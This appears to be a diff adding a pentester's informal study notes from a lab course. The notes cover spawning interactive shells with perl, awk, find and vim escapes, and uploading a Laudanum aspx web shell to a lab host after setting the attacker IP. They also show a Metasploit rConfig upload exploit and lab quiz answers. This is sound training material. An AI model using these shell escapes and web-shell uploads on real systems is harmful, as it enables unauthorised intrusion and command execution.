@@ -489,4 +489,78 @@ $sudo nmap -A -Pn <target>  > it show 80 443 mean it's an web ser
 $msfconsole -q  > set RHOSTS <target>  >  set LHOST <atk>  >  set SRVHOST <atk> > exploit
 use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 $cd /devicedetails  > cat hostnameinfor.txt
+\\\\=======================================
+spawning Interactive Shells
+with most linux we will get bourne shell (/bin/sh) and bourne again shell (/bin/bash)
+\\/bin/sh -ideals
+$/bin/sh -i  > this command will execute the shell interpreter specified in the path in interactive mode (-i)
+\\Perl to Shell 
+$perl -e 'exec "/bin/sh";'
+$perl: exec "/bin/sh";  the script should be run from a script
+\\ruby
+$ruby: exec "/bin/sh"  this command will execute the shell interpreter specified this should be run from a script
+\\lua 
+$lua: os.execute('/bin/sh')
+\\AWK  C-like pattern scanning and process present on most UNIX/linux,widely used by dev and sysope to generate report/
+$awk 'BEGIN {system("/bin/sh")}'
+\\find
+$find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+it will searching for any file listed after the -name then executes awk script
+\\Using Exec to Launch a Shell
+$find . -exec /bin/sh \; -quit
+this use of find and execute option (-exec) to iniatiate the shell interpreter directly. if find can;t find the specified file then no shell will be AuthenticationMethods
+\\Vim
+$vim -c ':!/bin/sh'
+Vim escape
+$vim 
+:set shell=/bin/sh
+:shell
+\\Execution Permissions considerations
+Permission 
+$ls -la <path/to/fileorbinary>
+\\Sudo -l
+\\\\\==============================================
+Introduction to Web Shell
+-as external pentest we ussually found (file upload atk, SQL injection, RFI/LFI, Command injection,etc,...)
+-password spraying (against RDS, VPN portals, Citrix, OWA, and other app using AD authentication and social engineering)
+-web app are often majority of what we see exposed during an external network assess and often present an anormous atk surface.
+- we may found publicly avail file upload from that let us directly upload a PHP, JSP, or ASP.NET web shell
+EX upload photo we can across app such as Tomcat, Axis2, or WebLogic, which allow us to deloy JSP code via a WAR file as part of theri func,
+we may even find a misconfig FTP service that allows file upload directly to the server webroot.
+\\Webshell
+is a browser-based shell session we can use to interact with the underlying oS of a web svr.
+-to gain remote code execution via web shell.we must find a website or web app vulnerability that can give us file upload capabilities, 
+-most web shells are gained by uploading a payload in a web language on the target svr. the payload(s) we upload should give us remote code execution capability within the browser.
+-payload web shell are temporary try to remote code execution via web app which give more interactive reverse shell
+\\Laudanum, One Webshell to rule Them All
+this is a repository of ready-made files that can be used to inject onto a victim and receive back access via reverse shell run commands on the victim host right from the browser, and more.
+-the repo includes injectable files for many diff web app language to include asp, aspx, jsp, php,... 
+-laudanum is built into Parrot OS and Kali by default. for any other distro, we need to pull a copy down to use 
+https://github.com/jbarcia/Web-Shells/tree/master/laudanum
+\\Working with Laudanum
+the Laudanum files can be found in the /usr/share/laudanum directory.most file in folder can be copy where we need them on the victim to run.
+-for specific files such as shells, we must edit the file first to insert your atking host IP addr to ensure we can access the web shell or receive a callback in the instance that we use a reverse shell.
+-be sure to read the contents and comments ato ensure take proper actions
+\\Laudanum Demonstration
+try to copy shell to target box entry /etc/hosts that entry should read <target ip>status/inlanefreight.local once this done we can play and explore this demonstration as long as we are on the VPN or using atkbox
+\\Move a Copy for Modifications
+$cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
+-add IP addr to the allowedIps variable on line 59. these item in a payload are often signatured on and can alert the defenders/AV to what we're doing
+\\Modify the Shell for Use
+try to upload file if successfuly it should print out the path to where the file was saved
+>navigate to web shell to utilize its functions. almost the filenames will come in randomize 
+-with particular web app our file went to status.inlanefreight.local\\files\demo.aspx and will require us to browse for the upload by using that \ in the path instead of the / like normal.
+once do this, browser will clean it up in URL window to appear as status.inlanefreight.local//files/demo.aspx
+\\Navigate to Our Shell
+status.inlanefreight.local//files/demo.aspx
+we can now utilize the laudanum to issue commands to the host.
+<test>Establish a web shell session with the target using the concepts covered in this section. 
+Submit the full path of the directory you land in. (Format: c:\path\you\land\in)
+$sudo bash -c 'echo "IP status.inlanefreight.local" >> /etc/hosts'
+cp /usr/share/laudanum/aspx/shell.aspx ./
+vim to modify row 59 to atk ip
+>>visit web  >>upload shell >> once upload it show a path >> navigate the path and submit the query with Dir command
 
+<test>Where is the Laudanum aspx web shell located on Pwnbox? 
+Submit the full path. (Format: /path/to/laudanum/aspx)
+ls /usr/share/laudanum/aspx/
